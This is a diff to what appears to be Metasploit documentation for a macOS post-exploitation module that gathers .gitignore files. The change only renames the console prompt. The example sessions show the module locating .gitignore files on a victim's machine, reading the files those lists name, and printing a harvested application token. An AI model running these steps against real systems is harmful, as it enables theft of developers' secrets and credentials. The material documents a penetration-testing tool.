@@ -42,9 +42,9 @@ Gitignore files commonly list items developers don't want leaked and generally c
 ### Finding gitignore files
 
 ```
-msf6 post(osx/gather/gitignore) > set mode 1
-msf6 post(osx/gather/gitignore) > set session 1
-msf6 post(osx/gather/gitignore) > run
+msf post(osx/gather/gitignore) > set mode 1
+msf post(osx/gather/gitignore) > set session 1
+msf post(osx/gather/gitignore) > run
 
 [*] Fetching .gitignore files
 [+] /Users/victim/Documents/project/.gitignore
@@ -55,9 +55,9 @@ msf6 post(osx/gather/gitignore) > run
 ### Recovering contents of a specific gitignore
 
 ```
-msf6 post(osx/gather/gitignore) > set file /Users/victim/project/.gitignore
-msf6 post(osx/gather/gitignore) > set mode 2
-msf6 post(osx/gather/gitignore) > run
+msf post(osx/gather/gitignore) > set file /Users/victim/project/.gitignore
+msf post(osx/gather/gitignore) > set mode 2
+msf post(osx/gather/gitignore) > run
 
 [+] /Users/victim/project/.gitignore
 [+] .sensitive_file
@@ -67,8 +67,8 @@ msf6 post(osx/gather/gitignore) > run
 ### Recovering contents of a sentitive file
 
 ```
-msf6 post(osx/gather/gitignore) > set file /Users/victim/project/.sensitive_file
-msf6 post(osx/gather/gitignore) > run
+msf post(osx/gather/gitignore) > set file /Users/victim/project/.sensitive_file
+msf post(osx/gather/gitignore) > run
 
 [+] /Users/victim/project/.sensitive_file
 [+] PWNED_APPLICATION_TOKEN=cHduZWQgdXIgZ2l0aHVi
